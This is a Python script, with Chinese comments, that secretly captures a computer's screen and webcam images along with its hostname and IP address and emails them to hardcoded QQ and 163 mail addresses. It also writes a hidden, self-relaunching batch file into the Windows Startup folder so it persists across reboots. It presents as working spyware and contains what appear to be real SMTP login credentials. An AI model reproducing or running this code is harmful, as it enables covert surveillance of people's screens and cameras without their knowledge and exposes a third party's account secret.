from email.mime.base import MIMEBase
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import time
import socket
import cv2
import os
from time import sleep
import pyautogui





def getMessege():
    #获取本机电脑名
    myname = socket.getfqdn(socket.gethostname(  ))
    #获取本机ip
    myaddr = socket.gethostbyname(myname)

    localtime = time.asctime( time.localtime(time.time()) )

    leirong="主机名:{}\r\n主机地址:{}\r\n电脑第一次开机联网时间:{}\r\n".format(myname,myaddr,localtime)
    return leirong
#处理记事本信息
def addAttach_txt(path,attachName):
    with open(str(path),'r',encoding='utf-8') as f:
        content = f.read()
        #设置html格式参数
        part1 = MIMEText(content,'plain','utf-8')
        #附件设置内容类型，方便起见，设置为二进制流
    part1['Content-Type'] = 'application/octet-stream'
    #设置附件头，添加文件名
    part1['Content-Disposition'] = 'attachment;filename={}'.format(attachName)      
    return part1  
  
#处理发送的图片
def addAttach_img(path):
    #添加照片附件
    with open(str(path),'rb') as fp:
        picture = MIMEImage(fp.read())
        fp.close()
        picture.add_header('Content-Disposition', 'attachment', filename="samplingImag.jpg")
        return picture

#处理要发送的文本信息
def addEmaill_txt(txt):
    part1 = MIMEText(txt,'plain','utf-8')
    return part1     

#单次图片
# def getImag(path):
#     try:
#       os.remove(output_dir)
#       print("删除成功")
#     except:
#         print("已删除")
#     cap = cv2.VideoCapture(0)
#     frame = cap.read()
#     cv2.imshow('采集', frame) #采集图像
#     cv2.imwrite(output_dir,img=frame)  #保存图像    



def senAttachImgLoop(nu,delay):
    try:
         cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
    except:
        print("没有内部相机")
        return 
    for nn in range(0,nu):
        path ='./img/{}.jpg'.format(str(nn))
        try:
            os.remove(path)
            print("采集第{}次".format(str(nn+1)))
        except:
            print("采集第{}次".format(str(nn+1)))
        ret1,frame1 = cap.read()
        cv2.imshow('采集', frame1) #采集图像
        cv2.imwrite(path,img=frame1)  #保存图像
        message.attach(addAttach_img(path))#添加第二组图片附件
        cv2.destroyAllWindows() 
        sleep(delay)

def screenAttachImagLoop(nu,delay):
    for nn in range(0,nu):
        path='./屏幕图{}.png'.format(str(nu))
        try:
            os.remove(path)
            pass
        except:
            pass
        pyautogui.screenshot(path)    
        print("截屏第{}次".format(str(nn+1)))    
        message.attach(addAttach_img(path))#添加第二组图片附件
        sleep(delay)



path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# dat ="nowPath"
filename =os.path.split(__file__)[-1] #获取当前文件名
folder = os.path.exists('请以管理员身份运行.txt')
if not folder:
    with open('请以管理员身份运行.txt','w',encoding='utf-8') as fp:
        fp.write('请以管理员身份运行{}exe\n请不要删除自动生成的文件!!!!!!'.format(filename[:-2]))

nowPath = os.getcwd()
pan =nowPath[0] #盘符
filepath = nowPath[2:]#文件路径
onedelay=120       #第一次延时时间120秒采集
loopdelay=20*60

datNowPath='@echo off\nif "%1" == "h" goto begin\nmshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit\n:begin\n{}\ncd {}\nTIMEOUT /T {}\n{}exe\nTIMEOUT /T {}\n{}bat'.format(pan,nowPath,onedelay,filename[:-2],loopdelay,filename[:-2])
folder = os.path.exists('{}bat'.format(filename[:-2]))
if not folder:
    with open('{}bat'.format(filename[:-2]),'w',encoding='utf-8') as fp:
        fp.write(datNowPath)


# @echo off
# if '%1'=='h' goto begin
# start mshta vbscript:createobject('wscript.shell').run('''%~nx0'' h',0)(window.close)&&exit
# :begin
# dat ="@echo off\nif '%1'=='h' goto begin\nstart mshta vbscript:createobject('wscript.shell').run('''%~nx0'' h',0)(window.close)&&exit\n:begin\n{}:\ncd {}\nTIMEOUT /T {}\n{}exe\n".format(pan,filepath,str(delay),filename[:-2])
# dat ='@echo off\nif "%1"=="h" goto begin\nstart mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit\n:begin\n{}:\ncd {}\nTIMEOUT /T {}\n{}exe\n'.format(pan,filepath,str(delay),filename[:-2])
dat ='{}:\ncd {}\n{}bat'.format(pan,filepath,filename[:-2])
try:
    with open("c://ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/"+"start.bat",'w',encoding='utf-8') as fp:
        fp.write(dat)
    print("必须要以管理员运行才行")
except:
    print("错误规避")



#设置登录及服务器信息
mail_host = 'smtp.qq.com'
mail_user = '2300010359'
mail_pass = 'sbhzmcoxhtuwecde'
sender = '2300010359@qq.com'
receivers = ['2300010359@qq.com',"pengyongtong999@163.com"]

#设置eamil信息
#添加一个MIMEmultipart类，处理正文及附件"2300010359"<2300010359@qq.com>;pengyongtong999<pengyongtong999@163.com> 
message = MIMEMultipart()
# message['From'] = 'pengyongtong999@163.com'
# message['To'] = '2300010359@qq.com'
message['Subject'] = '来自电脑的信息'
message['From'] = sender
message['To'] = receivers[0]









# while 1:
#以下单位都为S
getCutTime =0   #采集截图时间间隔
getXjTime =0   #采集相机时间间隔
getCutNu =1    #采集截图数量
getXjNu =1     #采集相机数量
runTime = 60  #采集周期

#推荐使用html格式的正文内容，这样比较灵活，可以附加图片地址，调整格式等
with open('emailxx.txt','w',encoding='utf-8') as fp:
    fp.write(getMessege())

message.attach(addAttach_txt('emailxx.txt',"fromComputer.txt")) #添加附件记事本    
folder = os.path.exists('./img')
if not folder:
    os.makedirs('./img')    
try:
    screenAttachImagLoop(getCutNu,getCutTime) #开机采集图片数量和间隔屏幕
except:
    print("图片附件添加出错")

try:
    senAttachImgLoop(getXjNu,getXjTime) #开机采集图片数量和间隔摄像头
except:
    print("图片附件添加出错")

message.attach(addEmaill_txt(getMessege()))#添加邮箱文字信息

# 登录并发送
try:
    smtpObj = smtplib.SMTP()
    smtpObj.connect(mail_host,25)
    smtpObj.login(mail_user,mail_pass)
    smtpObj.sendmail(
        sender,receivers,message.as_string())
    print('success')
    smtpObj.quit()
except smtplib.SMTPException as e:
    print('error',e)

    # sleep(runTime) #每隔1小时采集一次